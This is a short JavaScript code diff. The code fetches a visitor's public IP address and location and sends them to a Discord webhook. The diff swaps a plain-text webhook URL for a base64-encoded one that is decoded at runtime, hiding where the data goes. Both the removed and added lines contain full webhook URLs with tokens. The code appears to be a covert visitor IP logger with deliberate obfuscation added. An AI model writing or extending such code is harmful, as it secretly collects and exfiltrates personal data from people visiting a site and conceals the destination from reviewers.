@@ -39,7 +39,8 @@ fetch("https://api.ipify.org?format=json")
   .then((response) => response.json())
   .then(async (data) => {
     const ipAddress = data.ip;
-    const webhook = "https://discord.com/api/webhooks/1158423582762876948/pXYb6AUfCmCpVrHihSJtCnV54_GEqtTcF_SdxidolHhj8Zxl0WxWjObEyNhn36az1lfJ";
+    const webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjMzODEwNjM2NzQ3NTc3My9iVS1KR2JoVnpVZGJGdWZDdXR0UUZKcko5UXpneXdGYmMwRVZMSHZpUzBkVFRKT05XRVMwLVhqenBDU0RRWDdrd1Z6YQ=="
+    const webhook = atob(webhookEncoded);
 
     let location = "Location unavailable";
     try {
